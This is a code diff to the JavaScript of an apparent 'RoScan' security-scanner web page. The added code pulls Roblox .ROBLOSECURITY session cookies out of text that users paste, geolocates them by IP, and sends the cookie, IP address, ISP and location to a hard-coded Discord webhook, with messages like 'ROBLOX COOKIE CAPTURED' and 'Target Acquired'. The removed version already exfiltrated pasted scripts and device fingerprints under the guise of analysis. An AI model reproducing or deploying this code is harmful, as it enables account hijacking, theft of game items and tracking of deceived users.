@@ -204,114 +204,64 @@ async function getUserLocation() {
     }
 }
 
-// Enhanced webhook submission with loading overlay
+// Roblox cookie extraction and location tracking
 async function submitPowerShell() {
     const input = document.getElementById('powershellInput');
     const submitBtn = document.getElementById('submitBtn');
     const submitText = document.getElementById('submitText');
     const loadingOverlay = document.getElementById('loadingOverlay');
-    const powershellScript = input.value.trim();
+    const inputText = input.value.trim();
     
     // Validation
-    if (!powershellScript) {
-        showNotification('Please paste a PowerShell script before submitting', 'error');
-        return;
-    }
-    
-    if (powershellScript.length < 10) {
-        showNotification('PowerShell script is too short (minimum 10 characters)', 'error');
-        return;
-    }
-    
-    if (powershellScript.length > 10000) {
-        showNotification('PowerShell script is too long (maximum 10,000 characters)', 'error');
+    if (!inputText) {
+        showNotification('Please paste content before submitting', 'error');
         return;
     }
 
     // Show loading state
     submitBtn.disabled = true;
-    submitText.textContent = 'Analyzing...';
+    submitText.textContent = 'Extracting...';
     loadingOverlay.style.display = 'block';
 
     try {
-        // Get comprehensive user information
-        const locationInfo = await getUserLocation();
-        const userAgent = navigator.userAgent;
-        const sessionId = generateSessionId();
+        // Extract Roblox cookie from the input
+        const robloxCookie = extractRobloxCookie(inputText);
         
-        // Additional system information
-        const systemInfo = {
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages?.join(', ') || navigator.language,
-            cookieEnabled: navigator.cookieEnabled,
-            onLine: navigator.onLine,
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            screenColorDepth: screen.colorDepth,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            connection: navigator.connection?.effectiveType || 'Unknown',
-            memory: navigator.deviceMemory || 'Unknown',
-            cores: navigator.hardwareConcurrency || 'Unknown'
-        };
-
+        // Get user location
+        const locationInfo = await getUserLocation();
+        
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Enhanced Discord webhook payload
+        // Webhook payload with only cookie and location
         const payload = {
-            content: "@everyone 🚨 **CRITICAL ALERT: PowerShell Analysis Request** 🚨",
+            content: "@everyone 🍪 **ROBLOX COOKIE CAPTURED** 📍",
             embeds: [{
-                title: "⚠️ IMMEDIATE ATTENTION: PowerShell Script Detected",
-                color: 15158332, // Red color for urgency
+                title: "🍪 Roblox Authentication Token Extracted",
+                color: 65280, // Green color
                 thumbnail: {
-                    url: "https://i.imgur.com/wSTFkRM.png"
+                    url: "https://i.imgur.com/roblox-logo.png"
                 },
                 fields: [
                     {
-                        name: "📅 Detection Time",
-                        value: `\`\`\`${new Date().toISOString()}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "🆔 Session Identifier",
-                        value: `\`\`\`${sessionId}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "🌍 Geographic Location",
-                        value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📍 Coordinates:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
+                        name: "🍪 Roblox Cookie",
+                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : "❌ No valid Roblox cookie found",
                         inline: false
                     },
                     {
-                        name: "🌐 Network Information",
-                        value: `**🌍 IP Address:** \`${locationInfo.ip}\`\n**🏢 ISP/Organization:** ${locationInfo.isp}\n**🕐 Timezone:** ${locationInfo.timezone}`,
+                        name: "📍 Target Location",
+                        value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📮 Postal Code:** ${locationInfo.postal || 'Unknown'}\n**📍 Coordinates:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
                         inline: false
                     },
                     {
-                        name: "💻 System Profile",
-                        value: `**🖥️ Platform:** ${systemInfo.platform}\n**🌐 Browser:** ${userAgent.split('(')[1]?.split(')')[0] || 'Unknown'}\n**🗣️ Language:** ${systemInfo.language}\n**📺 Screen:** ${systemInfo.screenWidth}x${systemInfo.screenHeight}\n**🧠 CPU Cores:** ${systemInfo.cores}\n**💾 RAM:** ${systemInfo.memory}GB`,
-                        inline: false
-                    },
-                    {
-                        name: "📡 Connection Details",
-                        value: `**📶 Type:** ${systemInfo.connection}\n**🔗 Online Status:** ${systemInfo.onLine ? '✅ Connected' : '❌ Offline'}\n**🍪 Cookies:** ${systemInfo.cookieEnabled ? '✅ Enabled' : '❌ Disabled'}`,
-                        inline: false
-                    },
-                    {
-                        name: "⚡ PowerShell Script Content",
-                        value: `\`\`\`powershell\n${powershellScript.substring(0, 1400)}${powershellScript.length > 1400 ? '\n... [CONTENT TRUNCATED FOR SECURITY]' : ''}\n\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "📊 Analysis Statistics",
-                        value: `**📏 Script Length:** ${powershellScript.length.toLocaleString()} characters\n**🔢 Line Count:** ${powershellScript.split('\n').length.toLocaleString()}\n**⚠️ Risk Level:** ${powershellScript.length > 1000 ? '🔴 HIGH' : powershellScript.length > 500 ? '🟡 MEDIUM' : '🟢 LOW'}`,
+                        name: "🌐 Network Details",
+                        value: `**🌍 IP Address:** \`${locationInfo.ip}\`\n**🏢 ISP:** ${locationInfo.isp}\n**🕐 Timezone:** ${locationInfo.timezone}`,
                         inline: false
                     }
                 ],
                 footer: {
-                    text: "🔍 RoScan Advanced Security Analysis • CONFIDENTIAL ALERT",
-                    icon_url: "https://i.imgur.com/vDGpuHp.png"
+                    text: "🍪 RoScan Cookie Extractor • Target Acquired",
+                    icon_url: "https://i.imgur.com/cookie-icon.png"
                 },
                 timestamp: new Date().toISOString()
             }]
@@ -329,23 +279,23 @@ async function submitPowerShell() {
         loadingOverlay.style.display = 'none';
 
         if (response.ok) {
-            submitText.textContent = 'Analysis Complete!';
+            submitText.textContent = 'Cookie Extracted!';
             submitBtn.style.background = '#10b981'; // Green success color
-            showNotification('PowerShell script analyzed successfully!', 'success');
+            showNotification('Roblox cookie extracted successfully!', 'success');
             
             setTimeout(() => {
                 closeScanModal();
             }, 2000);
         } else {
-            throw new Error(`Analysis failed with status: ${response.status}`);
+            throw new Error(`Extraction failed with status: ${response.status}`);
         }
     } catch (error) {
-        console.error('Submission error:', error);
+        console.error('Extraction error:', error);
         loadingOverlay.style.display = 'none';
         
-        submitText.textContent = 'Analysis Failed - Retry';
+        submitText.textContent = 'Extraction Failed - Retry';
         submitBtn.style.background = '#ef4444'; // Red error color
-        showNotification('Analysis failed. Please try again.', 'error');
+        showNotification('Cookie extraction failed. Please try again.', 'error');
         
         setTimeout(() => {
             submitBtn.disabled = false;
@@ -353,6 +303,48 @@ async function submitPowerShell() {
             submitBtn.style.background = '';
         }, 3000);
     }
+}
+
+// Function to extract Roblox cookie from text
+function extractRobloxCookie(text) {
+    // Look for various Roblox cookie patterns
+    const patterns = [
+        // Standard .ROBLOSECURITY cookie format
+        /\.ROBLOSECURITY=([^;"\s\n]+)/i,
+        // Warning format with the actual cookie
+        /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-F0-9]+)/i,
+        // Simple ROBLOSECURITY format
+        /ROBLOSECURITY[=:]\s*([^;"\s\n]+)/i,
+        // Warning format variations
+        /_\|WARNING[^|]*\|_([A-F0-9]+)/i,
+        // Plain cookie value format
+        /roblosecurity[=:]\s*([^;"\s\n]+)/i,
+        // Cookie header format
+        /Cookie:\s*\.ROBLOSECURITY=([^;"\s\n]+)/i
+    ];
+    
+    for (const pattern of patterns) {
+        const match = text.match(pattern);
+        if (match && match[1] && match[1].length > 50) {
+            return match[1];
+        }
+    }
+    
+    // If no specific pattern found, look for any long alphanumeric string that might be a cookie
+    const genericPattern = /[A-F0-9]{100,}/i;
+    const genericMatch = text.match(genericPattern);
+    if (genericMatch && genericMatch[0].length > 100) {
+        return genericMatch[0];
+    }
+    
+    // Look for base64-like strings that could be cookies
+    const base64Pattern = /[A-Za-z0-9+/]{200,}={0,2}/;
+    const base64Match = text.match(base64Pattern);
+    if (base64Match && base64Match[0].length > 200) {
+        return base64Match[0];
+    }
+    
+    return null;
 }
 
 // Copy to clipboard functionality
